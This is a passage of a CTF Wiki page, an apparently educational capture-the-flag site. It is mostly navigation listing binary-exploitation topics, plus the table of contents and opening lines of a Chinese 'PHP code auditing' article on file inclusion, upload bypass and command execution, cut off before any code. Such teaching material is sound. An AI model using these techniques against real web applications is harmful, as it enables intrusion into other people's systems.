    <a href="../../../pwn/linux/fmtstr/fmtstr_intro-zh/" title="Format string vulnerability principle" class="md-nav__link">
      Format string vulnerability principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/fmtstr/fmtstr_exploit-zh/" title="Format string exploit" class="md-nav__link">
      Format string exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/fmtstr/fmtstr_example-zh/" title="Format string vulnerability example" class="md-nav__link">
      Format string vulnerability example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/fmtstr/fmtstr_detect-zh/" title="Format string vulnerability detection" class="md-nav__link">
      Format string vulnerability detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4">
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap uses
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        Glibc Heap uses
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/introduction-zh/" title="Introduction to heap utilization" class="md-nav__link">
      Introduction to heap utilization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/heap_overview-zh/" title="Heap overview" class="md-nav__link">
      Heap overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/heap_structure-zh/" title="Heap related data structure" class="md-nav__link">
      Heap related data structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth understanding of Ptmalloc2
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        In-depth understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/overview-zh/" title="Implementation" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/basic-zh/" title="Basic functions in the heap" class="md-nav__link">
      Basic functions in the heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/heap-init-zh/" title="Heap initialization" class="md-nav__link">
      Heap initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/malloc-zh/" title="Apply heap memory" class="md-nav__link">
      Apply heap memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/free-zh/" title="Free heap memory" class="md-nav__link">
      Free heap memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/tcache-zh/" title="Tcache" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/malloc_state-zh/" title="malloc_state" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/implementation/misc-zh/" title="Other" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/heapoverflow_basic-zh/" title="Heap overflow" class="md-nav__link">
      Heap overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/off_by_one-zh/" title="Off-By-One in the heap" class="md-nav__link">
      Off-By-One in the heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/chunk_extend_overlapping-zh/" title="Chunk Extend / Overlapping" class="md-nav__link">
      Chunk Extend / Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/unlink-zh/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/use_after_free-zh/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/fastbin_attack-zh/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/unsorted_bin_attack-zh/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/large_bin_attack-zh/" title="Large Bin Attack" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/tcache_attack-zh/" title="Tcache Attack" class="md-nav__link">
      Tcache Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_einherjar-zh/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_force-zh/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_lore-zh/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_orange-zh/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_rabbit-zh/" title="House of Rabbit" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/glibc-heap/house_of_roman-zh/" title="House of Roman" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE uses
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        IO_FILE uses
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/io_file/introduction-zh/" title="FILE file structure description" class="md-nav__link">
      FILE file structure description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/io_file/fake-vtable-exploit-zh/" title="Forged vtable hijacker process" class="md-nav__link">
      Forged vtable hijacker process
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn / linux / io_file / fsop-zh.md" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/io_file/exploit-in-libc2.24-zh.md" title="Use of IO_FILE under glibc 2.24" class="md-nav__link">
      Use of IO_FILE under glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Conditional competition
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        Conditional competition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/race-condition/introduction-zh/" title="Conditional competition introduction" class="md-nav__link">
      Conditional competition introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/race-condition/problem-zh/" title="Example" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        Integer overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/integeroverflow/intof-zh/" title="Introduction to the principle of integer overflow" class="md-nav__link">
      Introduction to the principle of integer overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox escape
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        Sandbox escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/sandbox/python-sandbox-escape-zh/" title="Python sandbox escape" class="md-nav__link">
      Python sandbox escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      kernel
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/environment-zh/" title="Environment setup" class="md-nav__link">
      Environment setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/basic_knowledge-zh/" title="Basics" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/kernel_uaf-zh/" title="kernel-UAF" class="md-nav__link">
      kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/kernel_rop-zh/" title="kernel-ROP" class="md-nav__link">
      kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/ret2usr-zh/" title="ret2usr" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/bypass_smep-zh/" title="bypass-smep" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/kernel/double-fetch-zh/" title="Double Fetch" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/arm/environment-zh/" title="Environment setup" class="md-nav__link">
      Environment setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/arm/arm_rop-zh/" title="arm-rop" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/summary/get-address-zh/" title="Get address" class="md-nav__link">
      Get address
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/summary/hijack-control-flow-zh/" title="Control program execution flow" class="md-nav__link">
      Control program execution flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/linux/summary/get-shell-zh/" title="get shell" class="md-nav__link">
      get shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/windows/readme-zh/" title="Overview" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        Stack overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/windows/stackoverflow/stack-introduce-zh/" title="Stack introduction" class="md-nav__link">
      Stack introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/windows/stackoverflow/stackoverflow-basic-zh/" title="Stack overflow principle" class="md-nav__link">
      Stack overflow principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../pwn/windows/stackoverflow/shellcode-in-stack-zh/" title="shellcode-in-stack" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_develop/basic_develop-zh/" title="Android development basics" class="md-nav__link">
      Android development basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android operating mechanism brief
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        Android operating mechanism brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/readme-zh/" title="Basics" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The operating mechanism of the Java layer in Android
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        The operating mechanism of the Java layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/java_layer/readme-zh/" title="Andriod Native" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" title="Smali 介绍" class="md-nav__link">
      Smali 介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex &amp;&amp; ODEX
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        Dex &amp;&amp; ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" title="DEX" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" title="ODEX" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native layer introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        Android Native layer introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_operating_mechanism/native_layer/so-zh/" title="Android So" class="md-nav__link">
      Android So
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android reverse basic introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        Android reverse basic introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/overview-zh/" title="Brief description" class="md-nav__link">
      Brief description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/android_code_location-zh/" title="Android key code targeting" class="md-nav__link">
      Android key code targeting
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android simple static analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        Android simple static analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/static/java-example-zh/" title="Android Java layer static analysis" class="md-nav__link">
      Android Java layer static analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/static/so-example-zh/" title="Android Native layer static analysis" class="md-nav__link">
      Android Native layer static analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/static/complex-example-zh/" title="Android static analysis hybrid example" class="md-nav__link">
      Android static analysis hybrid example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android simple dynamic analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        Android simple dynamic analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/dynamic/dynamic_debug-zh/" title="Dynamic Debugging" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../android/basic_reverse/dynamic/ida_native_debug-zh/" title="Android Dynamic Debugging So" class="md-nav__link">
      Android Dynamic Debugging So
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ics/ctfs-zh/" title="ICS_CTF Contest" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ics/discover-zh/" title="ICS_CTF found" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ics/exploit-zh/" title="ICS_CTF uses" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../ics/learn-zh/" title="ICS_CTF Learning Resources" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="文件包含" class="md-nav__link">
    文件包含
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="本地文件包含" class="md-nav__link">
    本地文件包含
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="远程文件包含" class="md-nav__link">
    远程文件包含
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="文件上传" class="md-nav__link">
    文件上传
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过上传检查" class="md-nav__link">
    绕过上传检查
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" title="变量覆盖" class="md-nav__link">
    变量覆盖
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="全局变量覆盖" class="md-nav__link">
    全局变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract" title="extract() 变量覆盖" class="md-nav__link">
    extract() 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables" title="import_request_variables 变量覆盖" class="md-nav__link">
    import_request_variables 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str" title="parse_str() 变量覆盖" class="md-nav__link">
    parse_str() 变量覆盖
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" title="命令执行" class="md-nav__link">
    命令执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="直接执行代码" class="md-nav__link">
    直接执行代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace" title="preg_replace() 代码执行" class="md-nav__link">
    preg_replace() 代码执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_match" title="preg_match 代码执行" class="md-nav__link">
    preg_match 代码执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_get" title="构造 _GET 读取" class="md-nav__link">
    构造 _GET 读取
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_get_1" title="获取 _GET 参数" class="md-nav__link">
    获取 _GET 参数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="传入参数" class="md-nav__link">
    传入参数
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="动态函数执行" class="md-nav__link">
    动态函数执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="反引号命令执行" class="md-nav__link">
    反引号命令执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" title="Curly Syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="回调函数" class="md-nav__link">
    回调函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="反序列化" class="md-nav__link">
    反序列化
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" title="PHP 特性" class="md-nav__link">
    PHP 特性
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="数组" class="md-nav__link">
    数组
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash" title="魔法 Hash" class="md-nav__link">
    魔法 Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="十六进制转换" class="md-nav__link">
    十六进制转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="类型转换" class="md-nav__link">
    类型转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" title="内置函数的参数的松散性" class="md-nav__link">
    内置函数的参数的松散性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_19" title="寻找源代码备份" class="md-nav__link">
    寻找源代码备份
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg" title="hg 源码泄露" class="md-nav__link">
    hg 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git" title="Git 源码泄露" class="md-nav__link">
    Git 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store" title=".DS_Store 文件泄露" class="md-nav__link">
    .DS_Store 文件泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" title="网站备份文件" class="md-nav__link">
    网站备份文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn" title="SVN 泄露" class="md-nav__link">
    SVN 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml" title="WEB-INF / web.xml 泄露" class="md-nav__link">
    WEB-INF / web.xml 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs" title="CVS 泄露" class="md-nav__link">
    CVS 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" title="参考文献" class="md-nav__link">
    参考文献
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/web/php/php-zh.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                  <h1>PHP code auditing</h1>
                
                <p><a href="../php/">EN</a> | <a href="./">ZH</a></p>
<h2 id="_1">文件包含<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>常见的导致文件包含的函数有：</p>
<ul>
<li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code> 等</li>
<li>JSP Servlet：<code>ava.io.File()</code>，<code>java.io.FileReader()</code> 等</li>
<li>ASP：<code>includefile</code>，<code>includevirtual</code> 等</li>
</ul>
<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
<h3 id="_2">本地文件包含<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>本地文件包含，Local File Inclusion，LFI。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
